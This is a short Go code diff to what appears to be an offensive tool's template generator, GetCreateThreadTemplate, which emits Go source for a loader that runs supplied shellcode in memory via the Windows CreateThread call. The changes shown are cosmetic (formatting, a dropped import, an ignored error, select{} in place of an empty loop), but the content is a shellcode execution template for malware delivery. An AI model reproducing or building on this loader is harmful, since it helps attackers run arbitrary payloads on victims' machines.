@@ -5,13 +5,12 @@ import (
 )
 
 func GetCreateThreadTemplate(targetProcess string) string {
-    var _ = targetProcess // unused in this template
+	var _ = targetProcess // unused in this template
 
 	return fmt.Sprintf(`
 package main
 
 import (
-	"fmt"
 	"syscall"
 	"unsafe"
 )
@@ -46,7 +45,7 @@ func ExecuteOrderSixtySix(shellcode []byte) {
 	)
 
 	// jump to shellcode
-	_, _, err = CreateThread.Call(
+	_, _, _ = CreateThread.Call(
 		0,    // [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
 		0,    // [in]            SIZE_T                  dwStackSize,
 		addr, // shellcode address
@@ -55,8 +54,7 @@ func ExecuteOrderSixtySix(shellcode []byte) {
 		0,    // [out, optional] LPDWORD                 lpThreadId
 	)
 
-	for {
-	}
+	select {}
 }
-    `,)
+    `)
 }
